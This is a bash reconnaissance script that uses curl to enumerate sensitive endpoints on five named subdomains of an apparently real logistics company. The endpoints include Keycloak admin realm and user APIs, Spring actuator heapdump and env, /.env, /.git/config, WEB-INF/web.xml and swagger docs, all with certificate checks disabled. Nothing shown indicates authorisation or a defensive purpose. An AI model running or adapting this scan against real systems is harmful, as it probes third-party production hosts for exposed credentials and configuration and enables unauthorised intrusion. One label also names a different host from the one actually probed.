#!/bin/bash
# Systematic probing for each target

probe() {
  local target="$1"
  local base="$2"
  local label="$3"
  echo "========== $label ($base) =========="
  for path in "${@:4}"; do
    code=$(curl -s -o /tmp/probe_resp.txt -w "%{http_code}" --connect-timeout 10 -k "$base$path" 2>/dev/null)
    size=$(wc -c < /tmp/probe_resp.txt 2>/dev/null)
    firstline=$(head -c 200 /tmp/probe_resp.txt 2>/dev/null | tr '\n' ' ' | head -c 150)
    echo "[$code] [$size b] GET $base$path"
    if [ "$code" = "200" ] && [ "$size" -gt "100" ]; then
      echo "  -> $firstline"
    fi
  done
}

# TARGET 1: Keycloak
echo "======================================"
echo "TARGET 1: Keycloak Admin Console"
echo "======================================"
for path in \
  /auth/admin/realms \
  /auth/admin/realms/master \
  /auth/admin/realms/master/users \
  /auth/admin/realms/master/groups \
  /auth/admin/realms/master/clients \
  /auth/admin/realms/master/roles \
  /auth/admin/realms/master/roles/realm \
  /auth/admin/realms/master/identity-provider \
  /auth/realms/master \
  /auth/realms/master/login-status-iframe.html \
  /auth/realms/master/account \
  /auth/realms/master/account/password \
  /actuator \
  /actuator/health \
  /actuator/info \
  /actuator/env \
  /.env \
  /robots.txt; do
  code=$(curl -s -o /tmp/t1_resp.txt -w "%{http_code}" --connect-timeout 10 -k "https://iamfw.home.oocllogistics.com$path" 2>/dev/null)
  size=$(wc -c < /tmp/t1_resp.txt 2>/dev/null)
  if [ "$code" != "302" ] && [ "$code" != "404" ]; then
    snippet=$(head -c 200 /tmp/t1_resp.txt 2>/dev/null | tr '\n' ' ' | head -c 150)
    echo "[$code] [$size b] GET https://iamfw.home.oocllogistics.com$path"
    echo "  -> $snippet"
  fi
done

echo ""
echo "======================================"
echo "TARGET 2: depot.oocllogistics.com"
echo "======================================"
for path in \
  / \
  /api \
  /api/v1 \
  /api/v1/user \
  /api/v1/user/info \
  /api/v1/users \
  /api/v1/config \
  /api/v1/order \
  /api/v1/depot \
  /api/v1/container \
  /api/v1/login \
  /api/v1/auth \
  /admin \
  /admin/ \
  /admin/user \
  /admin/users \
  /console \
  /console/ \
  /manager \
  /manager/ \
  /swagger-ui.html \
  /swagger-ui/ \
  /v2/api-docs \
  /v3/api-docs \
  /v3/api-docs/swagger-config \
  /api-docs \
  /doc.html \
  /actuator \
  /actuator/health \
  /actuator/info \
  /actuator/env \
  /actuator/heapdump \
  /actuator/threaddump \
  /actuator/metrics \
  /actuator/httptrace \
  /actuator/auditevents \
  /actuator/beans \
  /actuator/mappings \
  /actuator/configprops \
  /.env \
  /.git/HEAD \
  /WEB-INF/web.xml \
  /robots.txt \
  /sitemap.xml \
  /crossdomain.xml \
  /phpinfo.php \
  /info.php \
  /.git/config; do
  code=$(curl -s -o /tmp/t2_resp.txt -w "%{http_code}" --connect-timeout 10 -k "https://depot.oocllogistics.com$path" 2>/dev/null)
  size=$(wc -c < /tmp/t2_resp.txt 2>/dev/null)
  if [ "$size" -gt "0" ] && [ "$code" != "404" ] && [ "$code" != "000" ]; then
    snippet=$(head -c 200 /tmp/t2_resp.txt 2>/dev/null | tr '\n' ' ' | head -c 150)
    echo "[$code] [$size b] GET https://depot.oocllogistics.com$path"
    [ "$size" -gt "10" ] && echo "  -> $snippet"
  fi
done

echo ""
echo "======================================"
echo "TARGET 3: depotpp.oocllogistics.com"
echo "======================================"
for path in \
  / \
  /api \
  /api/ \
  /api/user \
  /api/v1 \
  /api/v1/user \
  /api/v1/user/info \
  /api/v1/users \
  /api/v1/config \
  /api/v1/order \
  /api/v1/depot \
  /api/v1/container \
  /api/v1/login \
  /api/v1/auth \
  /api/v1/system \
  /api/login \
  /api/auth \
  /api/depot \
  /api/container \
  /admin \
  /admin/ \
  /admin/user \
  /admin/users \
  /console \
  /console/ \
  /manager \
  /manager/ \
  /swagger-ui.html \
  /swagger-ui/ \
  /v2/api-docs \
  /v3/api-docs \
  /doc.html \
  /api-docs \
  /actuator \
  /actuator/health \
  /actuator/info \
  /actuator/env \
  /actuator/heapdump \
  /actuator/threaddump \
  /actuator/metrics \
  /actuator/beans \
  /actuator/mappings \
  /actuator/configprops \
  /.env \
  /.git/HEAD \
  /WEB-INF/web.xml \
  /robots.txt \
  /sitemap.xml \
  /phpinfo.php \
  /info.php \
  /.git/config \
  /DMS \
  /dms \
  /dms/ \
  /DMS/ \
  /login \
  /login/ \
  /css/vendors-bootstrap.c63d053f.css \
  /img/ \
  /favicon_red.ico; do
  code=$(curl -s -o /tmp/t3_resp.txt -w "%{http_code}" --connect-timeout 10 -k "https://depotpp.oocllogistics.com$path" 2>/dev/null)
  size=$(wc -c < /tmp/t3_resp.txt 2>/dev/null)
  if [ "$size" -gt "0" ] && [ "$code" != "404" ] && [ "$code" != "000" ]; then
    snippet=$(head -c 200 /tmp/t3_resp.txt 2>/dev/null | tr '\n' ' ' | head -c 150)
    echo "[$code] [$size b] GET https://depotpp.oocllogistics.com$path"
    [ "$size" -gt "10" ] && echo "  -> $snippet"
  fi
done

echo ""
echo "======================================"
echo "TARGET 4: olpspotfireprd.oocllogistics.com"
echo "======================================"
for path in \
  / \
  /spotfire \
  /spotfire/ \
  /spotfire/ui/index.html \
  /spotfire/api/ \
  /spotfire/rest/ \
  /spotfire/rest/api/ \
  /spotfire/rest/api/libraries \
  /spotfire/rest/info \
  /spotfire/rest/service/ \
  /spotfire/js/ \
  /api \
  /api/ \
  /api/v1 \
  /api/v1/user \
  /api/v1/config \
  /swagger-ui.html \
  /v2/api-docs \
  /v3/api-docs \
  /doc.html \
  /actuator \
  /actuator/health \
  /actuator/env \
  /actuator/info \
  /.env \
  /.git/HEAD \
  /robots.txt \
  /login \
  /admin \
  /manager; do
  code=$(curl -s -o /tmp/t4_resp.txt -w "%{http_code}" --connect-timeout 10 -k "https://olpspotfireprd.oocllogistics.com$path" 2>/dev/null)
  size=$(wc -c < /tmp/t4_resp.txt 2>/dev/null)
  if [ "$size" -gt "0" ] && [ "$code" != "404" ] && [ "$code" != "000" ]; then
    snippet=$(head -c 200 /tmp/t4_resp.txt 2>/dev/null | tr '\n' ' ' | head -c 150)
    echo "[$code] [$size b] GET https://olpspotfireprd.oocllogistics.com$path"
    [ "$size" -gt "10" ] && echo "  -> $snippet"
  fi
done

echo ""
echo "======================================"
echo "TARGET 5: depotaat.oocllogistics.com"
echo "======================================"
for path in \
  / \
  /api \
  /admin \
  /login \
  /actuator; do
  code=$(curl -s -o /tmp/t5_resp.txt -w "%{http_code}" --connect-timeout 10 -k "https://depotuat.oocllogistics.com$path" 2>/dev/null)
  size=$(wc -c < /tmp/t5_resp.txt 2>/dev/null)
  echo "[$code] [$size b] GET https://depotuat.oocllogistics.com$path"
done
